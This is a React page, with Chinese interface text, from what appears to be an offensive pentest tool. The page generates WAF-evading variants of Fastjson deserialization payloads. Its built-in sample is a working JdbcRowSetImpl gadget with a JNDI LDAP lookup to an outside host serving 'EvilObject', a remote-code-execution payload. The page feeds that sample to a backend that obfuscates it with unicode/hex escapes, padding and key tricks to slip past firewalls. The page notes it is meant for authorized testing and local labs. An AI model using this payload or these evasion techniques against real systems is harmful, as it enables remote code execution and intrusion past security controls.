"use client";

import { useEffect, useState } from "react";
import { Copy, Loader2, ShieldOff, Wand2 } from "lucide-react";
import { toast } from "sonner";

import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { Button, buttonVariants } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Separator } from "@/components/ui/separator";
import { Textarea } from "@/components/ui/textarea";
import {
  listWafTechniques,
  runWaf,
  type WafResult,
  type WafTechnique,
} from "@/lib/api";
import { cn } from "@/lib/utils";

const SAMPLE =
  '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"${jndi:ldap://1.1.1.1:1389/EvilObject}","autoCommit":true}';

export default function WafPage() {
  const [techniques, setTechniques] = useState<WafTechnique[]>([]);
  const [selected, setSelected] = useState<string[]>([]);
  const [payload, setPayload] = useState(SAMPLE);
  const [mode, setMode] = useState<"variants" | "stack">("variants");
  const [commaCount, setCommaCount] = useState("5");
  const [padSize, setPadSize] = useState("20000");
  const [padKey, setPadKey] = useState("f");
  const [includeTypeKey, setIncludeTypeKey] = useState(false);
  const [hexGhostFiller, setHexGhostFiller] = useState("_");
  const [unicodeDigitScript, setUnicodeDigitScript] = useState("fullwidth");
  const [ghostK, setGhostK] = useState("1");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<WafResult | null>(null);

  useEffect(() => {
    void listWafTechniques()
      .then((items) => {
        setTechniques(items);
        setSelected(items.map((t) => t.id));
      })
      .catch((err) => {
        toast.error(err instanceof Error ? err.message : String(err));
      });
  }, []);

  function toggleTech(id: string) {
    setSelected((prev) =>
      prev.includes(id) ? prev.filter((x) => x !== id) : [...prev, id],
    );
  }

  function selectAll() {
    setSelected(techniques.map((t) => t.id));
  }

  function clearAll() {
    setSelected([]);
  }

  async function onRun() {
    if (!payload.trim()) {
      toast.error("请填写原始 payload");
      return;
    }
    if (mode === "stack" && selected.length === 0) {
      toast.error("叠加模式请至少选择一种变换");
      return;
    }
    setLoading(true);
    setResult(null);
    try {
      const data = await runWaf({
        payload: payload.trim(),
        techniques: selected,
        mode,
        options: {
          comma_count: Number(commaCount) || 5,
          pad_size: Number(padSize) || 20000,
          pad_key: padKey.trim() || "f",
          include_type_key: includeTypeKey,
          hex_ghost_filler: hexGhostFiller || "_",
          unicode_digit_script: unicodeDigitScript || "fullwidth",
          ghost_k: Number(ghostK) || 1,
        },
      });
      setResult(data);
      toast.success(data.summary);
    } catch (err) {
      toast.error(err instanceof Error ? err.message : String(err));
    } finally {
      setLoading(false);
    }
  }

  async function copyText(text: string, label = "已复制") {
    try {
      await navigator.clipboard.writeText(text);
      toast.success(label);
    } catch {
      toast.error("复制失败");
    }
  }

  return (
    <main className="mx-auto flex w-full max-w-5xl flex-1 flex-col gap-6 px-6 py-10">
      <div className="space-y-2">
        <h1 className="flex items-center gap-2 text-2xl font-semibold tracking-tight">
          <ShieldOff className="size-6" />
          WAF 绕过
        </h1>
        <p className="text-sm text-muted-foreground">
          对已有 Fastjson payload 做本地变换（unicode/hex、多逗号、key{" "}
          <code>_</code>/<code>-</code>、填充、URL 编码等），对接{" "}
          <code>/api/waf</code>。不向目标发包。
        </p>
      </div>

      <div className="grid gap-6 lg:grid-cols-[1.1fr_0.9fr]">
        <Card>
          <CardHeader>
            <CardTitle>输入与选项</CardTitle>
            <CardDescription>
              <code>variants</code> 为每种变换各出一份；<code>stack</code>{" "}
              按所选顺序叠加。
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <div className="flex items-center justify-between gap-2">
                <Label htmlFor="payload">原始 payload</Label>
                <Button
                  type="button"
                  variant="ghost"
                  size="sm"
                  onClick={() => setPayload(SAMPLE)}
                >
                  填入示例
                </Button>
              </div>
              <Textarea
                id="payload"
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
                className="min-h-36 font-mono text-xs"
              />
            </div>

            <div className="grid gap-3 sm:grid-cols-2">
              <div className="space-y-2">
                <Label>模式</Label>
                <Select
                  value={mode}
                  onValueChange={(v) => setMode(v as "variants" | "stack")}
                >
                  <SelectTrigger className="w-full">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="variants">variants（各单项）</SelectItem>
                    <SelectItem value="stack">stack（顺序叠加）</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-2">
                <Label htmlFor="comma">多逗号数量</Label>
                <Input
                  id="comma"
                  value={commaCount}
                  onChange={(e) => setCommaCount(e.target.value)}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="pad-size">填充长度</Label>
                <Input
                  id="pad-size"
                  value={padSize}
                  onChange={(e) => setPadSize(e.target.value)}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="pad-key">填充字段名</Label>
                <Input
                  id="pad-key"
                  value={padKey}
                  onChange={(e) => setPadKey(e.target.value)}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="hex-ghost-filler">hex_ghost 填充符</Label>
                <Input
                  id="hex-ghost-filler"
                  maxLength={1}
                  value={hexGhostFiller}
                  onChange={(e) => setHexGhostFiller(e.target.value.slice(0, 1) || "_")}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="unicode-digit-script">unicode_digit 字形</Label>
                <Input
                  id="unicode-digit-script"
                  placeholder="fullwidth|thai|gurmukhi"
                  value={unicodeDigitScript}
                  onChange={(e) => setUnicodeDigitScript(e.target.value)}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="ghost-k">ghost_bits 高字节 k</Label>
                <Input
                  id="ghost-k"
                  value={ghostK}
                  onChange={(e) => setGhostK(e.target.value)}
                />
              </div>
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <Button
                type="button"
                variant={includeTypeKey ? "default" : "outline"}
                size="sm"
                onClick={() => setIncludeTypeKey((v) => !v)}
              >
                key 变换含 @type
              </Button>
              <span className="text-xs text-muted-foreground">
                1.2.36+ 才建议混用 _/-
              </span>
            </div>

            <Separator />

            <div className="space-y-2">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <Label>变换技</Label>
                <div className="flex gap-1">
                  <Button type="button" variant="ghost" size="sm" onClick={selectAll}>
                    全选
                  </Button>
                  <Button type="button" variant="ghost" size="sm" onClick={clearAll}>
                    清空
                  </Button>
                </div>
              </div>
              <div className="flex flex-wrap gap-2">
                {techniques.map((t) => {
                  const on = selected.includes(t.id);
                  return (
                    <button
                      key={t.id}
                      type="button"
                      title={t.description}
                      onClick={() => toggleTech(t.id)}
                      className={cn(
                        buttonVariants({
                          variant: on ? "default" : "outline",
                          size: "sm",
                        }),
                      )}
                    >
                      {t.title}
                    </button>
                  );
                })}
              </div>
            </div>

            <Button onClick={() => void onRun()} disabled={loading}>
              {loading ? (
                <Loader2 className="size-4 animate-spin" />
              ) : (
                <Wand2 className="size-4" />
              )}
              生成
            </Button>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>结果</CardTitle>
            <CardDescription>
              {result ? result.summary : "生成后在此展示与复制"}
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {!result ? (
              <Alert>
                <AlertTitle>提示</AlertTitle>
                <AlertDescription>
                  产物面向 Fastjson 解析器，不一定是标准 JSON。仅用于授权测试
                  / 本地靶场。
                </AlertDescription>
              </Alert>
            ) : (
              <>
                <div className="flex flex-wrap gap-2">
                  {result.techniques.map((id) => (
                    <Badge key={id} variant="secondary">
                      {id}
                    </Badge>
                  ))}
                </div>

                {mode === "stack" || result.variants.length <= 1 ? (
                  <div className="space-y-2">
                    <div className="flex justify-end">
                      <Button
                        type="button"
                        variant="outline"
                        size="sm"
                        onClick={() => void copyText(result.payload)}
                      >
                        <Copy className="size-4" />
                        复制
                      </Button>
                    </div>
                    <Textarea
                      readOnly
                      value={result.payload}
                      className="min-h-48 font-mono text-xs"
                    />
                  </div>
                ) : (
                  <div className="space-y-4">
                    {result.variants.map((v) => (
                      <div key={v.technique} className="space-y-2 rounded-lg border p-3">
                        <div className="flex items-start justify-between gap-2">
                          <div>
                            <div className="font-medium">{v.title}</div>
                            <div className="text-xs text-muted-foreground">
                              {v.description}
                            </div>
                          </div>
                          <Button
                            type="button"
                            variant="outline"
                            size="sm"
                            onClick={() => void copyText(v.payload, `已复制 ${v.technique}`)}
                          >
                            <Copy className="size-4" />
                            复制
                          </Button>
                        </div>
                        <Textarea
                          readOnly
                          value={
                            v.payload.length > 4000
                              ? `${v.payload.slice(0, 4000)}\n…(已截断预览，复制可得全文)`
                              : v.payload
                          }
                          className="min-h-28 font-mono text-xs"
                        />
                      </div>
                    ))}
                  </div>
                )}

                {result.notes.length > 0 ? (
                  <ul className="list-inside list-disc text-xs text-muted-foreground">
                    {result.notes.map((n) => (
                      <li key={n}>{n}</li>
                    ))}
                  </ul>
                ) : null}
              </>
            )}
          </CardContent>
        </Card>
      </div>
    </main>
  );
}
